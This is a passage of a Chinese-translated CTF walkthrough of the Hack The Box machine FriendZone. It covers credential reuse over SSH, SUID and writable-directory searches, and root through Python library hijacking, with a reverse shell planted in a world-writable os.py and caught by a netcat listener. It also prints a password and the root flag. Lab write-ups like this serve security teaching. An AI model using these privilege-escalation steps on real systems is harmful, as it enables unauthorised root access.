robots.txt  wordpress<br/>www-data@FriendZone:/var/www/html$ cat robots.txt <br/>seriously ?!<br/>www-data@FriendZone:/var/www/html$ cd wordpress/<br/>www-data@FriendZone:/var/www/html/wordpress$ ls<br/>www-data@FriendZone:/var/www/html/wordpress$ ls -al<br/>total 8<br/>drwxr-xr-x 2 root root 4096 Oct  5  2018 .<br/>drwxr-xr-x 3 root root 4096 Oct  6  2018 ..<br/>www-data@FriendZone:/var/www/html/wordpress$ cd ..<br/>www-data@FriendZone:/var/www/html$ ls<br/>fz.jpg  index.bak  index.html  robots.txt  wordpress<br/>www-data@FriendZone:/var/www/html$ cat index.html <br/>&lt;title&gt;Friend Zone Escape software&lt;/title&gt;</span><span id="cb11" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;h2&gt;Have you ever been friendzoned ?&lt;/h2&gt;&lt;/center&gt;</span><span id="bef7" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;img src="fz.jpg"&gt;&lt;/center&gt;</span><span id="5bce" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;h2&gt;if yes, try to get out of this zone ;)&lt;/h2&gt;&lt;/center&gt;</span><span id="c71c" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;h2&gt;Call us at : +999999999&lt;/h2&gt;&lt;/center&gt;</span><span id="ef32" class="mg kz iq mc b gy ml mi l mj mk">&lt;center&gt;&lt;h2&gt;Email us at: info@friendzoneportal.red&lt;/h2&gt;&lt;/center&gt;</span></pre><p id="4e98" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">找不到任何有用的东西。我检查etc/passwd。</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nl"><img src="../Images/728c07618871d5826a73a506e453f8ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wI4oFoSBeQOCdSysamJWIw.png"/></div></div></figure><p id="0684" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">转到用户朋友的主目录，我们可以将user.txt读作www-data:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nm"><img src="../Images/7d855a84c1165440b77242849f24233d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*0iTVISNPSq9PEDMX6t9-ug.png"/></div></div></figure><p id="5799" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以有2种方法可以检索user.txt，我尝试了同样的凭证(朋友:Agpyu12！0.213$)到ssh:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="f826" class="mg kz iq mc b gy mh mi l mj mk">➜  writeup ssh -l friend 10.10.10.123<br/>friend@10.10.10.123's password:<br/>Welcome to Ubuntu 18.04.1 LTS (GNU/Linux 4.15.0-36-generic x86_64)</span><span id="8f99" class="mg kz iq mc b gy ml mi l mj mk">* Documentation:  <a class="ae kl" href="https://help.ubuntu.com" rel="noopener ugc nofollow" target="_blank">https://help.ubuntu.com</a><br/> * Management:     <a class="ae kl" href="https://landscape.canonical.com" rel="noopener ugc nofollow" target="_blank">https://landscape.canonical.com</a><br/> * Support:        <a class="ae kl" href="https://ubuntu.com/advantage" rel="noopener ugc nofollow" target="_blank">https://ubuntu.com/advantage</a></span><span id="3d21" class="mg kz iq mc b gy ml mi l mj mk">You have mail.<br/>Last login: Thu Jan 24 01:20:15 2019 from 10.10.14.3<br/>friend@FriendZone:~$</span></pre><h1 id="5443" class="ky kz iq bd la lb lc ld le lf lg lh li lj lk ll lm ln lo lp lq lr ls lt lu lv bi translated">获取根目录:</h1><p id="d569" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated">我首先运行一个查找SUID文件的find命令，将stderror重定向到/dev/null，因为有许多文件不是SUID文件(为了避免您的终端出现大量错误):</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="2b81" class="mg kz iq mc b gy mh mi l mj mk"><strong class="mc ir">find / -perm -4000 2&gt;/dev/null</strong></span></pre><p id="ed16" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">输出中没有什么有趣的东西:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="0067" class="mg kz iq mc b gy mh mi l mj mk">/bin/fusermount                                                                                                                                                               <br/>/bin/umount                                                                                                                                                                   <br/>/bin/mount                                                                                                                                                                    <br/>/bin/su                                                                                                                                                                       <br/>/bin/ntfs-3g                                                                                                                                                                  <br/>/bin/ping                                                                                                                                                                     <br/>/usr/bin/passwd                                                                                                                                                               <br/>/usr/bin/traceroute6.iputils                                                                                                                                                  <br/>/usr/bin/newgrp                                                                                                                                                               <br/>/usr/bin/sudo                                                                                                                                                                 <br/>/usr/bin/gpasswd                                                                                                                                                              <br/>/usr/bin/chsh                                                                                                                                                                 <br/>/usr/bin/chfn                                                                                                                                                                 <br/>/usr/sbin/exim4                                                                                                                                                               <br/>/usr/lib/dbus-1.0/dbus-daemon-launch-helper                                                                                                                                   <br/>/usr/lib/eject/dmcrypt-get-device                                                                                                                                             <br/>/usr/lib/openssh/ssh-keysign</span></pre><p id="94c5" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">没什么特别的。我检查任何人都可以写的目录，将错误重定向到/dev/null:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="570a" class="mg kz iq mc b gy mh mi l mj mk"><strong class="mc ir">find / -perm -222 -type d 2&gt;/dev/null</strong></span></pre><p id="69ef" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我通过SMB(/etc/Development)和/usr/lib/python2.7找到了我们上传shell的位置:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="bd81" class="mg kz iq mc b gy mh mi l mj mk">/etc/sambafiles<br/>/etc/Development<br/>/var/spool/samba<br/>/var/tmp<br/>/var/lib/php/sessions<br/>/tmp<br/>/tmp/.Test-unix<br/>/tmp/.ICE-unix<br/>/tmp/.font-unix<br/>/tmp/.X11-unix<br/>/tmp/.XIM-unix<br/>/run/lock<br/>/usr/lib/python2.7<br/>/dev/mqueue<br/>/dev/shm</span></pre><p id="3266" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我查看了目录/usr/lib/python2.7并检查了感兴趣的文件，发现os.py拥有777权限，并且以<strong class="jp ir"> ROOT </strong>身份运行:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi nn"><img src="../Images/401821a1c460bf2f9326f7673c674e4b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*ExsleSBOHrNPDAixspixNw.png"/></div></div></figure><p id="888d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我还运行了<a class="ae kl" href="https://github.com/DominicBreuker/pspy" rel="noopener ugc nofollow" target="_blank"> pspy </a>，它在CTFs/HTB机器上非常有用，它是一个命令行工具，设计用来窥探进程，不需要root权限。它允许您查看其他用户运行的命令、cron作业等。当他们执行的时候。让它运行，我看到reporter.py每隔一段时间执行一次:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi no"><img src="../Images/5ddc7e683757cd1df3a4eac51c7a2a15.png" data-original-src="https://miro.medium.com/v2/resize:fit:1284/format:webp/1*tBkjgfvleN3TT-YwTrK5vw.png"/></div></figure><p id="7f54" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">server_admin目录非常突出，因为我可以从那里读取文件，所以我读取了reporter.py:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="113c" class="mg kz iq mc b gy mh mi l mj mk">friend@FriendZone:/opt/server_admin$ cat reporter.py <br/>#!/usr/bin/python</span><span id="b82d" class="mg kz iq mc b gy ml mi l mj mk">import os</span><span id="2022" class="mg kz iq mc b gy ml mi l mj mk">to_address = "<a class="ae kl" href="mailto:admin1@friendzone.com" rel="noopener ugc nofollow" target="_blank">admin1@friendzone.com</a>"<br/>from_address = "<a class="ae kl" href="mailto:admin2@friendzone.com" rel="noopener ugc nofollow" target="_blank">admin2@friendzone.com</a>"</span><span id="b676" class="mg kz iq mc b gy ml mi l mj mk">print "[+] Trying to send email to %s"%to_address</span><span id="f4f2" class="mg kz iq mc b gy ml mi l mj mk">#command = ''' mailsend -to <a class="ae kl" href="mailto:admin2@friendzone.com" rel="noopener ugc nofollow" target="_blank">admin2@friendzone.com</a> -from <a class="ae kl" href="mailto:admin1@friendzone.com" rel="noopener ugc nofollow" target="_blank">admin1@friendzone.com</a> -ssl -port 465 -auth -smtp smtp.gmail.co-sub scheduled results email +cc +bc -v -user you -pass "PAPAP"'''</span><span id="5b0b" class="mg kz iq mc b gy ml mi l mj mk">#os.system(command)</span><span id="8773" class="mg kz iq mc b gy ml mi l mj mk"># I need to edit the script later<br/># Sam ~ python developer</span></pre><p id="5f70" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">所以python脚本还没有完成，但是它调用了os库，就像我们之前看到的那样，它以root身份运行。现在，我在网上查了一下我如何才能做到这一点，发现这些很有帮助:</p><h2 id="70fc" class="mg kz iq bd la np nq dn le nr ns dp li jy nt nu lm kc nv nw lq kg nx ny lu nz bi translated">来谈谈来自SANS的Mark Baggett的黑暗面(这家伙的Python太棒了)</h2><p id="ffa2" class="pw-post-body-paragraph jn jo iq jp b jq lw js jt ju lx jw jx jy ly ka kb kc lz ke kf kg ma ki kj kk ij bi translated"><a class="ae kl" href="https://www.sans.org/cyber-security-summit/archives/file/summit-archive-1542133788.pdf" rel="noopener ugc nofollow" target="_blank">https://www . sans . org/cyber-security-summit/archives/file/summit-archive-1542133788 . pdf</a></p><h2 id="6a12" class="mg kz iq bd la np nq dn le nr ns dp li jy nt nu lm kc nv nw lq kg nx ny lu nz bi translated">通过从光栅化劫持Python库来提升权限</h2><div class="oa ob gp gr oc od"><a href="https://rastating.github.io/privilege-escalation-via-python-library-hijacking/" rel="noopener  ugc nofollow" target="_blank"><div class="oe ab fo"><div class="of ab og cl cj oh"><h2 class="bd ir gy z fp oi fr fs oj fu fw ip bi translated">通过Python库劫持| rastating.github.io提升权限</h2><div class="ok l"><h3 class="bd b gy z fp oi fr fs oj fu fw dk translated">今天在调试一个Python脚本时，我发现我无法执行它，堆栈跟踪指向…</h3></div><div class="ol l"><p class="bd b dl z fp oi fr fs oj fu fw dk translated">rastating.github.io</p></div></div><div class="om l"><div class="on l oo op oq om or ks od"/></div></div></a></div><p id="51a2" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">然后，我检查了查找库的搜索过程的“优先级”:</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="6081" class="mg kz iq mc b gy mh mi l mj mk">friend@FriendZone:/tmp$ python -c 'import sys; print "\n".join(sys.path)'</span><span id="4c1f" class="mg kz iq mc b gy ml mi l mj mk">/usr/lib/python2.7<br/>/usr/lib/python2.7/plat-x86_64-linux-gnu<br/>/usr/lib/python2.7/lib-tk<br/>/usr/lib/python2.7/lib-old<br/>/usr/lib/python2.7/lib-dynload<br/>/usr/local/lib/python2.7/dist-packages<br/>/usr/lib/python2.7/dist-packages</span></pre><p id="5833" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">即使我们不能在脚本运行的当前目录上写入(这是优先级，并且那里没有os.py)，我们也可以在/usr/lib/python2.7上写入(第二个选项)，并且我们可以在os.py上进行更改，因为它将被运行的reporter.py调用。</p><p id="e518" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我在os.py脚本的底部添加了一个反向shell脚本:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div role="button" tabindex="0" class="mn mo di mp bf mq"><div class="gh gi os"><img src="../Images/881bb972c8f8424cf5bb041184d02f0d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*m-3aXhXpIIBbPARByOcKrA.png"/></div></div></figure><p id="0372" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">看到它从pspy64触发:</p><figure class="kn ko kp kq gt kr gh gi paragraph-image"><div class="gh gi ot"><img src="../Images/bbbc74b2aee4873adaf4e24c94593a0a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1026/format:webp/1*xAbh0AMFXQrRsp1mSH4USg.png"/></div></figure><p id="7627" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我得到我的壳作为根。</p><pre class="kn ko kp kq gt mb mc md me aw mf bi"><span id="b7ae" class="mg kz iq mc b gy mh mi l mj mk">➜  writeup nc -nlvp 9003<br/>listening on [any] 9003 ...<br/>connect to [10.10.14.8] from (UNKNOWN) [10.10.10.123] 52620<br/>/bin/sh: 0: can't access tty; job control turned off<br/># id<br/>uid=0(root) gid=0(root) groups=0(root)<br/># cat /root/root.txt<br/><strong class="mc ir">b0e6c60b82cf96e9855ac1656a9e90c7</strong></span></pre><p id="cce3" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">我找到了一些证书文件，但没有深入到我可以使用它们的地方。因为我不知道钥匙的密码。英雄联盟</p><p id="7a60" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated">这就是我如何破解Friendzone的。我希望你能从这次演练中学到一些东西。干杯！🍺</p></div><div class="ab cl ou ov hu ow" role="separator"><span class="ox bw bk oy oz pa"/><span class="ox bw bk oy oz pa"/><span class="ox bw bk oy oz"/></div><div class="ij ik il im in"><p id="0e2d" class="pw-post-body-paragraph jn jo iq jp b jq jr js jt ju jv jw jx jy jz ka kb kc kd ke kf kg kh ki kj kk ij bi translated"><em class="pb">关注</em> <a class="ae kl" href="https://medium.com/bugbountywriteup" rel="noopener"> <em class="pb"> Infosec报道</em> </a> <em class="pb">获取更多此类精彩报道。</em></p><div class="oa ob gp gr oc od"><a href="https://medium.com/bugbountywriteup" rel="noopener follow" target="_blank"><div class="oe ab fo"><div class="of ab og cl cj oh"><h2 class="bd ir gy z fp oi fr fs oj fu fw ip bi translated">信息安全报道</h2><div class="ok l"><h3 class="bd b gy z fp oi fr fs oj fu fw dk translated">收集了世界上最好的黑客的文章，主题从bug奖金和CTF到vulnhub…</h3></div><div class="ol l"><p class="bd b dl z fp oi fr fs oj fu fw dk translated">medium.com</p></div></div><div class="om l"><div class="pc l oo op oq om or ks od"/></div></div></a></div></div></div>    
</body>
</html>